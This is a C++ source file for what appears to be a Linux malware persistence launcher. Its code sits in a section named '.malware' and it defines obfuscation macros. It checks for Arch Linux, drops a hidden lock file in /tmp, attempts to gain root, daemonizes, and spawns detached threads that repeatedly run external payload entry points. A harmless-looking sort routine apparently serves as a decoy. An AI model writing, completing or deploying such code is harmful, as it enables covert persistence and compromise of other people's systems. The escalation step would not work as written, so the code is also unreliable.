#define _unused_ __attribute__((unused))
#define _noreturn_ __attribute__((noreturn))
#define _sec __attribute__((section(".malware")))
#define _opt(opt) __attribute__((optimize(opt)))
#define obf_sc static volatile
#define OBF_LOOP(i,N) for(int i=0, __L=200*N; i < __L; ++i) if((i%N)==0)

#include <unistd.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <sys/stat.h>
#include <pthread.h>
#include <sched.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <cstring>
#include <cstdlib>

// New file support
extern "C" void __zzEntry(void);
extern "C" void __extraEntry(void);  // new file entry point

#define ARCH_LINUX_ID "/etc/arch-release"
#define INFECTOR "sortd"
#define BACKEND_FOLDER "/usr/local/.backend"
#define CREATOR_FOLDER "/usr/local/.creator"
#define PERSIST_MARKER "/tmp/.sysunit.lock"

_sec _opt("O1") int check_arch() {
    FILE *f = fopen(ARCH_LINUX_ID, "r");
    if(f) { fclose(f); return 1; }
    return 0;
}

_sec void mark_persist_marker() {
    int fd = open(PERSIST_MARKER,O_CREAT|O_WRONLY,0600);
    if(fd>0) {
        write(fd,"ARCHX",5);
        close(fd);
        chmod(PERSIST_MARKER,0000);
    }
}

_sec void escalate_and_touch() {
    if(getuid()!=0) {
        seteuid(0);
        setuid(0);
    }
}

_sec void launch_manager_asm() {
    __zzEntry();
}

// Launch the new file's logic as well
_sec void launch_extra_file() {
    __extraEntry();
}

_sec void *persist_scheduler_thread(_unused_ void *) {
    while(1) {
        launch_manager_asm();
        launch_extra_file(); // run new file logic in each loop
        sleep(40 + (rand()%25));
    }
    return NULL;
}

_sec void multithread_auto_spawn() {
    pthread_t th1,th2;
    pthread_create(&th1,NULL,persist_scheduler_thread,NULL);
    pthread_detach(th1);
    pthread_create(&th2,NULL,persist_scheduler_thread,NULL);
    pthread_detach(th2);
}

_sec _noreturn_ _opt("O0") int persist_daemon() {
    pid_t pid = fork();
    if(pid>0) _exit(0);
    setsid();
    chdir("/");
    umask(0);
    mark_persist_marker();
    escalate_and_touch();
    launch_manager_asm();
    launch_extra_file(); // start new file logic in daemon
    multithread_auto_spawn();
    _exit(0);
}

_sec int main() {
    if(!check_arch()) return 0;
    escalate_and_touch();
    mark_persist_marker();
    launch_manager_asm();
    launch_extra_file(); // start new file logic in main
    multithread_auto_spawn();
    persist_daemon();
    std::vector<int> x = {7,4,2,9,1,8,3,6};
    for(size_t i=0;i+1<x.size();++i)
        for(size_t j=i+1;j<x.size();++j)
            if(x[i]>x[j])
                std::swap(x[i],x[j]);
    return 0;
}
